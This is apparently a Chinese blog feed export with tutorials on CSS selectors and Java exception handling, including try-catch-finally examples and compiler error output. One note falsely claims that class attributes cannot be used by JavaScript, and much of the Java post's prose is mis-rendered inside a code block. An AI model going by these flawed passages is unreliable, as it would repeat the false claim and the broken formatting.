<p>这种定义class 的方式是前端开发最常用的选择器，有几个突出的特点：可以给不同的标签设置同一个类，从而用一条CSS命令控制几个标签，减少大量代码，是页面修改简单，易维护，易改版；其次，后台工作人员机会不会用到有关class的相关设置，不需要跟后台人员之间进行交互；再者，可以通过js等动态改变标签的Classname，从而改变整个标签的样式，使前端动态效果实现起来更为容易。</p>
</blockquote>
<br />

<p><font face="Microsoft YaHei"><strong>（3）id选择器</strong></font></p>
<ul>
<li><p>ID选择器和类选择器相似，不同的是，ID选择器不能复用。在一个XHTML文档中，一个ID选择器只能把其CSS样式指定给一个标签。 </p>
</li>
<li><p><font color="#FF7F00"><strong>注：</strong></font>网页中HTML标签的id属性的值，必须是唯一的。id属性一般是给JS使用的，不是让你来加样式的。class属性只能给CSS用，不能给JS用的。</p>
</li>
<li><p>id选择器的名称，必须以**<code>#</code>**开头，后跟HTML标记的id属性的值。</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;php.cn&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    <span class="comment">#NO1&#123;</span></span><br><span class="line">        color:blue;</span><br><span class="line">        background-color:<span class="comment">#88ff99;</span></span><br><span class="line">    &#125;</span><br><span class="line">    .haha&#123;</span><br><span class="line">         color:red;</span><br><span class="line">         background-color:<span class="comment">#88ff66;</span></span><br><span class="line">     &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;NO1&quot;</span>&gt;习近平心中的互联网&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;haha&quot;&gt;互联网是20世纪最伟大的发明。&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<p><font face="Microsoft YaHei"><strong>（4）选择器的优先级</strong></font></p>
<p>参考：<br><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/css-style-priority.html">CSS 样式优先级</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/ombre/p/7418667.html">CSS样式优先级问题</a>》</font> </p>
<blockquote>
<p><strong>选择器的优先级从高到低：</strong><br>ID 选择器， 如 <strong><code>#id&#123;&#125;</code></strong><br>类选择器， 如 <strong><code>.class&#123;&#125;</code></strong><br>属性选择器， 如 <strong><code>a[href=&quot;segmentfault.com&quot;]&#123;&#125;</code></strong><br>伪类选择器， 如 <strong><code>:hover&#123;&#125;</code></strong><br>伪元素选择器， 如 <strong><code>::before&#123;&#125;</code></strong><br>标签选择器， 如 <strong><code>span&#123;&#125;</code></strong><br>通配选择器， 如 <strong><code>*&#123;&#125;</code></strong></p>
</blockquote>
<br />

<h5 id="2-id、class选择器的区别"><a href="#2-id、class选择器的区别" class="headerlink" title="2. id、class选择器的区别"></a><font color="#00B2EE" face="Microsoft YaHei">2. id、class选择器的区别</font></h5><p>id和class属性是网页中两个通用的属性，它们协同工作使整个页面变得丰富多彩。当我们为一个元素定义样式时。可以使用id，也可以使用class。但是我们也应该注意这两者的区别。 </p>
<ol>
<li><p>在css样式表中书写时，id选择符前面应该加前缀符号‘#’，而class选择符前面应该加前缀符号‘.’。 </p>
</li>
<li><p>id属性一般在一个页面中只可以使用一次，而class可以被多次引用。 </p>
</li>
<li><p>id作为元素的标签，用于区分不同结构和内容，而class作为一个样式，它可以应用到任何结构和内容上。 </p>
</li>
<li><p>在布局思路上，一般坚持这样的原则：id是先确定页面的结构和内容，然后再为它定义样式：而class相反，它先定义好一类样式，然后再页面中根据需要把类样式应用到不同的元素和内容上面。 </p>
</li>
<li><p>目前浏览器都能允许在同一个页面内出现多个相同属性值的id，一般情况下也能正常显示，不过当使用javascript通过id来控制元素时就会出现错误。 </p>
</li>
<li><p>在实际应用时，class更多的被应用到文字版块以及页面修饰等方面，而id更多地被用来实现宏伟布局和设计包含块，或包含框的样式。</p>
</li>
</ol>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>ID 有高优先级、唯一性的特点，特指「个体」。<br>相对于 ID，class 的优先级比较适中，特指「特定群体」。<br>Class 的使用需要参考面向对象的抽象概念，把共有的属性抽象出来。</li>
<li>ID是先找到结构&#x2F;内容，再给它定义样式；<br>Class是先定义好一种样式，再套给多个结构&#x2F;内容</li>
</ol>
<br />

<h5 id="3-组合选择器"><a href="#3-组合选择器" class="headerlink" title="3. 组合选择器"></a><font color="#00B2EE" face="Microsoft YaHei">3. 组合选择器</font></h5><p><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html">CSS 组合选择器</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html">CSS基础教程之组合选择器</a>》</font> </p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-异常处理(5)</title>
    <url>/post/Java-Exception-Handling7/</url>
    <content><![CDATA[<p>&amp;emsp;<br>&amp;emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>异常处理</font></center>

<p><a href="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png"><img data-src="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png" alt="程序错误.png"></a><br><a href="https://i.loli.net/2018/12/28/5c25e36859c86.png"><img data-src="https://i.loli.net/2018/12/28/5c25e36859c86.png" alt="程序错误1.png"></a></p>
<p>&amp;emsp;</p>
<h3 id="一、-Java异常基础"><a href="#一、-Java异常基础" class="headerlink" title="一、 Java异常基础"></a><font color="#FF6347" face="Comic sans MS">一、 Java异常基础</font></h3><h4 id="1-1-为什么要引入异常处理机制？"><a href="#1-1-为什么要引入异常处理机制？" class="headerlink" title="1.1  为什么要引入异常处理机制？"></a><font color="#20B2AA" face="Comic sans MS">1.1  为什么要引入异常处理机制？</font></h4><p><font face="Comic sans MS"><font color="red"><strong>程序的错误分为：</strong></font><br><strong>编译错误：</strong>程序员编写程序时语法上出现的错误；<br><strong>运行错误：</strong>程序员编写的程序在语法上没有错误，但是程序在运行时出现错误，本章就主要针对该类错误讲解 -&amp;ensp;- 即异常、异常类和异常处理机制。</font></p>
<p>&amp;emsp;</p>
<h4 id="1-2-以往的错误处理方法"><a href="#1-2-以往的错误处理方法" class="headerlink" title="1.2  以往的错误处理方法"></a><font color="#20B2AA" face="Comic sans MS">1.2  以往的错误处理方法</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**主要缺陷：**
&emsp;程序复杂
&emsp;可靠性差
&emsp;返回信息有限
&emsp;返回代码标准化困难　
以往的程序开发过程中，常常采用<font color="#00B2EE">**返回值**</font>进行处理。例如，在编写一个方法，可以返回一个状态代码，调用者
根据状态代码判断出错与否。若状态代码表示一个错误，则调用该错误的处理程序进行相应的处理，或显示一
个错误页面或错误信息。
</font></td></tr></table>

<p><em>举例</em> <em><strong>以往的错误处理方法：采用返回值进行处理</strong></em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">举例：实现将一个文件从硬盘加载近来，导致加载可能失败的运行错误有硬盘错误、文件无法找到等</span><br><span class="line"><span class="keyword">int</span> status=loadTextfile();</span><br><span class="line">If (status!=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="comment">//something unusual happened, describe it</span></span><br><span class="line"> <span class="keyword">switch</span>(status) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line">       <span class="comment">//file not found</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">       <span class="comment">//disk error</span></span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//other error&#125;</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//file loaded OK, continue with program&#125; </span></span><br><span class="line">```      </span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.3  Java异常处理方法&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#ADD8E6&gt;&lt;font face=&quot;Comic sans MS&quot;&gt;Java异常处理方法：Java为运行错误引入了异常、异常类和异常处理机制。</span><br><span class="line">  **异常：**特殊的运行错误，是在程序运行过程中发生的、会打断程序正常执行的错误</span><br><span class="line">　例如：</span><br><span class="line">　除<span class="number">0</span>溢出</span><br><span class="line">　文件找不到</span><br><span class="line">  数组元素下标越界　</span><br><span class="line"></span><br><span class="line">**异常类：**Java用面向对象的方法处理异常，Java的异常类是处理运行时错误的特殊类，每一种异常类对应一种</span><br><span class="line">特定的运行错误，每一个异常事件由一个异常类的对象来代表。</span><br><span class="line"> *例如：除<span class="number">0</span>溢出（ArithmeticException）</span><br><span class="line">　　　文件找不到（FileNotFoundException）</span><br><span class="line">　　　数组元素下标越界（ArrayIndexOutofBoundsException）*</span><br><span class="line"></span><br><span class="line">**异常处理机制：抛出异常——捕捉异常：**</span><br><span class="line"> 1.  当出现了一些错误，方法都会产生一个&lt;font color=&quot;red&quot;&gt;异常对象&lt;/font&gt;，这个异常对象将交由运行系统来处理。此过程就称为抛出</span><br><span class="line">     &lt;font color=&quot;red&quot;&gt;(throwing)异常&lt;/font&gt;。**包括：系统抛出、用户自定义抛出。**</span><br><span class="line"> <span class="number">2.</span>  接着，运行系统开始寻找合适的处理方法，来处理这个异常。如果系统找到了一个适合的处理该异常方法，</span><br><span class="line">     这一过程就叫&lt;font color=&quot;red&quot;&gt;捕获异常&lt;/font&gt;。</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.4  异常处理的语法支持&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#ADD8E6&gt;&lt;font face=&quot;Comic sans MS&quot;&gt;       **－try,catch,throws,throw,finally**</span><br><span class="line">(<span class="number">1</span>) <span class="keyword">try</span>包含可能出现异常的语句块；</span><br><span class="line">(<span class="number">2</span>) 一个或多个<span class="keyword">catch</span>块紧随<span class="keyword">try</span>&#123;&#125;块，每个<span class="keyword">catch</span>块通常处理指定类型的异常；</span><br><span class="line">(<span class="number">3</span>) <span class="keyword">finally</span>引导块紧随<span class="keyword">catch</span>块后，主要用于清理现场（可有可无）。</span><br><span class="line">格式：</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123; ......</span><br><span class="line">&#125;<span class="keyword">catch</span>( ExceptionName1 e )</span><br><span class="line">&#123; ......&#125;</span><br><span class="line"><span class="keyword">catch</span>( ExceptionName2 e )</span><br><span class="line">&#123; ......&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123; ......&#125;</span><br><span class="line">注意：<span class="keyword">finally</span>总是执行，<span class="keyword">catch</span>块不一定执行</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.5  总结&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#EEE0E5&gt;&lt;font face=&quot;Comic sans MS&quot;&gt; (1) Java的异常处理把错误集中起来统一处理。程序员只需要说明何处可能出现异常，如何处理即可；</span><br><span class="line"> (<span class="number">2</span>) 采用面向对象的思想标准化了各种错误的类型；</span><br><span class="line"> (<span class="number">3</span>) Java把程序运行过程中可能遇到的问题分为两类，一类是致命性的，即程序遇到了非常严重的不正常状</span><br><span class="line"> 态，不能简单地恢复执行，这就是&lt;font color=&quot;red&quot;&gt;**错误(对应Error类)**&lt;/font&gt;，如程序运行过程中内存耗尽。另一类是非致命性的，</span><br><span class="line"> 通过某种处理后程序还能继续运行，这就是&lt;font color=&quot;red&quot;&gt;**异常(对应Exception类)**&lt;/font&gt;。</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">### &lt;font color=&quot;#FF6347&quot; face=&quot;Comic sans MS&quot;&gt;二、 异常类的层次&lt;/font&gt;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;2.1  异常分类&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;Comic sans MS&quot;&gt;&lt;font color=&quot;red&quot;&gt;**☕异常类：**&lt;/font&gt;异常在Java中都是作为类的实例(对象)的形式出现的。</span><br><span class="line">&amp;emsp;     如 Throwable类, Exception类, Error类……</span><br><span class="line"></span><br><span class="line">&lt;font color=&quot;red&quot;&gt;**☕Java中异常分类：**&lt;/font&gt;</span><br><span class="line"> (1)  &lt;font color=&quot;#00B2EE&quot;&gt;**Error类及其子类：**&lt;/font&gt;描述Java运行时刻系统内部的错误或资源枯竭导致的错误，无法恢复和抛出，发生几率小；</span><br><span class="line"> (2)  &lt;font color=&quot;#00B2EE&quot;&gt;**Exception类及其子类：**&lt;/font&gt;普通程序可以从中恢复，分为&lt;font color=&quot;red&quot;&gt;**运行时异常**&lt;/font&gt;和&lt;font color=&quot;red&quot;&gt;**非运行时异常**&lt;/font&gt;。</span><br><span class="line"></span><br><span class="line">&amp;emsp;异常在Java中也是作为类的实例的形式出现的。Java中的所有的异常类都是从Throwable类派生出来的。&lt;font color=&quot;red&quot;&gt;**Throwable类有两个直接子类：**&lt;/font&gt;&lt;font color=&quot;#00B2EE&quot;&gt;**java.lang.Error**&lt;/font&gt; 和 &lt;font color=&quot;#00B2EE&quot;&gt;**java.lang.Exception**&lt;/font&gt;。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">异常类的层次结构如下图所示。</span><br><span class="line">![<span class="number">58.</span>png](https:<span class="comment">//i.loli.net/2018/12/28/5c2621a200c43.png)</span></span><br><span class="line">**(<span class="number">1</span>) 🔺Error类及其子类主要用来描述一些Java运行时刻系统内部的错误或资源枯竭导致的错误。**普通的程序不能从这类错误中恢复，也无法抛出这种类型的错误，这类错误出现的几率是很小的。</span><br><span class="line">**(<span class="number">2</span>) 🔺另一个异常类的子类是Exception类和它的子类。**在编程中错误的处理主要是对这类错误的处理，如除数为零、数组下标越界等。类Exception是普通程序可以从中恢复的所有规范了的异常的父类。</span><br><span class="line">&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;2.2  Exception类的子类&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;Comic sans MS&quot;&gt;&lt;font color=&quot;red&quot;&gt;**☕Exception类子类有两种：**&lt;/font&gt;</span><br><span class="line">**运行时异常**和**非运行时异常（一般异常）**　&amp;emsp;&amp;emsp;&amp;emsp;　*区别？？？*</span><br><span class="line">&lt;font color=&quot;#00B2EE&quot;&gt;**（1）运行时异常：**&lt;/font&gt;RuntimeException类及其所有子类。      运行时异常是程序员编写程序不正确所导致的异常，理论上，程序员经过检查和测试可以查出这类错误。如**除数为零等，错误的强制类型转换、数组越界访问、空引用**。</span><br><span class="line">&lt;font color=&quot;#00B2EE&quot;&gt;**（2）非运行时异常（一般异常）：**&lt;/font&gt;指可以由编译器在编译时检测到的、可能会发生在方法执行过程中的异常，如找不到指定的文件等，这不是程序本身的错误，如果这些异常情况没有发生，程序本身仍然是完好的。　　</span><br><span class="line">&lt;font color=&quot;red&quot;&gt;**注意：**&lt;/font&gt;**编译器强制要求Java程序必须**&lt;font color=&quot;#00B2EE&quot;&gt;**捕获**&lt;/font&gt;**或**&lt;font color=&quot;#00B2EE&quot;&gt;**声明抛出**&lt;/font&gt;**所有非运行时异常，但对运行时异常不作要求。运行时异常编译可以通过但是运行时出现异常；非运行时异常编译的时候就通不过。**</span><br><span class="line"></span><br><span class="line">*例如：格式不正确的URL、试图为一个不存在的类找到一个代表它的类的对象。除了runtimeexception及其子类以外，其他exception类的子类都是非运行时异常。*</span><br><span class="line">&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="comment">//运行时异常和非运行时异常区别举例  </span></span><br><span class="line">[例<span class="number">5</span>-<span class="number">1</span>] RuntimeExceptionDemo1.java</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RuntimeExceptionDemo1</span></span>&#123;  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="number">2</span>/<span class="number">0</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line">该程序能编译通过，而在运行时，出现如下提示：</span><br><span class="line">&gt; javac RuntimeExceptionDemo1.java</span><br><span class="line">&gt; java RuntimeExceptionDemo1</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArithmeticException: / by zero at </span><br><span class="line">RuntimeExceptionDemo1.main(RuntimeExceptionDemo1.java:<span class="number">4</span>)</span><br><span class="line"><span class="comment">//这里的&quot;ArithmeticException&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">       FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">        in.close();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">会出现如下的错误提示：</span><br><span class="line">javac NonRuntimeExceptionDemo1.java</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">5</span>: unreported exception java.io.FileNotFoundException; must</span><br><span class="line"> be caught or declared to be thrown</span><br><span class="line">FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">                   ^</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">7</span>: unreported exception java.io.IOException; mustbe</span><br><span class="line"> caught or declared to be thrown</span><br><span class="line"><span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">                ^</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">8</span>: unreported exception java.io.IOException; mustbe caught </span><br><span class="line">or declared to be thrown</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>☕对运行时异常的说明：</strong></font>由于运行时异常可能会出现在程序的任何地方，而且出现的可能性非常大，因而由程序本身去检测运行异常出现与否，将会使程序的开销过大，所以<br>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置<br><font color="#00B2EE"><strong>建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程的希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误。</strong></font><br>&amp;emsp;<br><font color="red"><br><strong>☕对运行时异常和非运行时异常的总结：</strong></font><br>(1) 当出现java.lang.ArithmeticException运行时异常时，不需要用户在程序中对其进行处理，而直接由Java运行时系统进行处理；<br>(2) 对于非运行时异常，Java编译器对程序进行编译的时候，便指出用户需要<font color="#00B2EE">①捕获该类异常</font>或者<font color="#00B2EE">②声明抛出</font>。即对于非运行时异常，用户需要在程序中进行处理，否则编译时无法通过。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">① 捕获该类异常</span><br><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">             FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> s;</span><br><span class="line">            <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">           in.close();</span><br><span class="line">              &#125;<span class="keyword">catch</span>(Exception e)&#123;…&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">② 声明抛出</span><br><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">      FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">      <span class="keyword">int</span> s;</span><br><span class="line">      <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">      in.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-对于运行时异常和非运行时异常的一些说明"><a href="#2-3-对于运行时异常和非运行时异常的一些说明" class="headerlink" title="2.3  对于运行时异常和非运行时异常的一些说明"></a><font color="#20B2AA" face="Comic sans MS">2.3  对于运行时异常和非运行时异常的一些说明</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. ☕编译器和异常：</strong></font>编译器强制要求程序员捕获或声明抛出非运行时异常<br>   <em>到底为什么要这么做呢？？？</em><br>对于运行时异常，编译器不强制要求，但用户也可以自己去捕获<br>   <em>这个时候会出现什么效果呢？？？</em></p>
<p><font color="red"><strong>2. ☕运行时系统和异常：</strong></font><br>(1) 异常都有抛出的轨迹；<br>(2) 对于所有异常，某个方法产生的异常 ，如果没有被捕获，就会自动抛给方法的调用者（但是对非运行时异常一定要声明抛出），如果调用者还没有捕获，再抛给调用者的调用者，以此类推，直到main方法里发现还没有捕获，那么运行时系统就会来处理这个异常，把异常信息和异常的轨迹信息打印给用户。</p>
<p><font color="red"><strong>3. ☕两点建议：</strong></font><br>(1) 建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程者希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误；<br>(2) 建议对于非运行时异常，用户应该去捕获，以交代程序员的处理该错误的代码，实在不行，就声明抛出给方法的调用者。</p>
<p><font color="red"><strong>3. ☕异常类常用的方法：</strong></font><br><font color="#00B2EE"><strong>public Exception()</strong></font><br><font color="#00B2EE"><strong>public Exception(String s)</strong></font>&amp;emsp; :该参数一般表示该异常对应的错误的描述<br><font color="#00B2EE"><strong>public String toString()</strong></font>&amp;emsp;:返回描述当前异常对象信息的字符串<br><font color="#00B2EE"><strong>public String getMessage()</strong></font>&amp;emsp;:返回描述当前异常对象信息的详细信息。<br><font color="#00B2EE"><strong>public void printStackTrace()</strong></font>&amp;emsp;:打印当前异常对象使用堆栈的轨迹。<br></font></p>
<p><img data-src="https://i.loli.net/2018/12/29/5c2656f46e0d4.png" alt="5S.png"></p>
<p><img data-src="https://i.loli.net/2018/12/29/5c2656f96a129.png" alt="4DI6.png"></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-try-catch-finally异常处理"><a href="#三、-try-catch-finally异常处理" class="headerlink" title="三、 try-catch-finally异常处理"></a><font color="#FF6347" face="Comic sans MS">三、 try-catch-finally异常处理</font></h3><h4 id="3-1-概括try-catch-finally语句"><a href="#3-1-概括try-catch-finally语句" class="headerlink" title="3.1  概括try-catch-finally语句"></a><font color="#20B2AA" face="Comic sans MS">3.1  概括try-catch-finally语句</font></h4><p><font face="Comic sans MS"><font color="red"><strong>用户处理异常的三种方法:</strong></font><br>       (1)用户可以用try-catch-finally语句进行<font color="#00B2EE"><strong>抛出</strong></font>和<font color="#00B2EE"><strong>捕获处理</strong></font>；<br>       (2)如果不想捕获和处理异常，可以通过throws语句<font color="#00B2EE"><strong>声明要抛出的异常</strong></font>；<br>       (3) 用户可以定义自己的异常类,并用throw语句来抛出。</p>
<p>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置。即：<font color="red"><strong>运行时异常：会输出到设备显示哪里存在错误，请更正；非运行时异常：编译报错时提示必须添加非运行时异常处理，比如加try{}…catch(类名 对象){}或者使用throws来抛出异常</strong></font>。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>-<span class="keyword">catch</span>-<span class="keyword">finally</span>语句对程序运行进行监控，捕获和处理异常通常形式： </span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">调用可能产生异常的方法及其它java语句；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类名<span class="number">1</span> 异常对象名e)&#123;</span><br><span class="line">异常处理语句块；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类名<span class="number">2</span> 异常对象名e)&#123;</span><br><span class="line">异常处理语句块；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line">最终处理；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">5</span>-<span class="number">3</span>]访问文本文件text.txt，并将其在屏幕上打印出来。</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TryCatchFinally</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">        in.close();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span>(FileNotFoundException e)&#123;</span><br><span class="line">          System.out.println(“捕获异常：”+e);   <span class="comment">//e会调用toString()方法回显异常信息给程序员</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;捕获异常：&quot;</span>+e);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">finally</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;finally块总是执行！&quot;</span>);</span><br><span class="line">       &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">捕获异常：java.io.FileNotFoundException: text.txt (系统找不到指定的文件。)</span><br><span class="line"><span class="keyword">finally</span>块总是执行！</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-2-try语句"><a href="#3-2-try语句" class="headerlink" title="3.2  try语句"></a><font color="#20B2AA" face="Comic sans MS">3.2  try语句</font></h4><p><font face="Comic sans MS">☕<font color="red"><strong>try{}</strong></font>：将可能抛出一个或者若干个异常的代码放入try语句块中。<br><font color="red"><strong>注意：</strong></font>应当尽量<strong>减小</strong>try代码块的大小，不要将整个程序代码全部放入try语句块中，而是应当仔细分析代码，在可能出现异常情况的地方用try进行监控。</p>
